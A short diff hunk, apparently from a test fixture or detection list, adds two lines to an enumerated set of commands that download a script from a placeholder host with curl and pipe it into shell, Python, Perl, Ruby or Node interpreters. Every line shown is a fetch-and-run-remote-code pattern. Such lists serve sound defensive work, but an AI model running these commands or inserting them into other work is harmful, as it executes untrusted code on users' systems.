@@ -1277,6 +1277,8 @@ curl -s https://lookup.example/install.sh | sh
 curl -s https://lookup.example/install.sh | bash
 curl -s https://lookup.example/install.sh | zsh
 curl -s https://lookup.example/x.py | python
+curl -s https://lookup.example/x.py | python3 -
+curl -s https://lookup.example/x | python3 -c 'import sys; exec(sys.stdin.read())'
 curl -s https://lookup.example/x.pl | perl
 curl -s https://lookup.example/x.rb | ruby
 curl -s https://lookup.example/x.js | node
